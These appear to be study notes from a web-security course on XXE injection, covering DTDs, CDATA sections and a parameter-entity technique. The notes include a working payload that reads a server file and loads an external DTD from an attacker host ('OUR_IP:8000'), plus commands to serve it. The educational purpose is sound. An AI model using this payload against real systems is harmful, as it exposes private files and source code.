XXE vulnerabilities mainly occur when an unsafe XML input references an external entity, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well.
# Defining Internal Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ELEMENT note (to, from, message)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT message (#PCDATA)>
]>
<note>
  <to>Alice</to>
  <from>Bob</from>
  <message>Hello there!</message>
</note>
```
- The root element is `note`
- `note` must contain `to`, `from`, and `message` elements in that order
# CDATA TAG?
CDATA stands for "Character Data" and is used to tell the XML parser to ignore markup characters within the CDATA section.

CDATA sections are wrapped with the following syntax:
`<![CDATA[ content goes here ]]>`

The primary purpose of CDATA sections is to include content that contains characters that would otherwise be interpreted as XML markup (like <, >, &, etc.) without having to escape them.

![[Pasted image 20250510174852.png]]

---
# XML Parameter Entities
a special type of entity that starts with a `%` character and can only be used within the DTD. if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

serve dtd
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;`
entity.
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```
## Exploit using Parameter Entity  
![[Pasted image 20250510175404.png]]

# (CDATA EXPLOIT STEPS)

1. define begin, end,  as parameter entities eg( %begin, %END)
2. write a dtd with entity definition `joined` that combines all parameter entities.
3. Reference that external .DTD with %XXE PE.
4.  call the external entity `&joined;`

---
# exercise
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

![[Pasted image 20250510182531.png]]
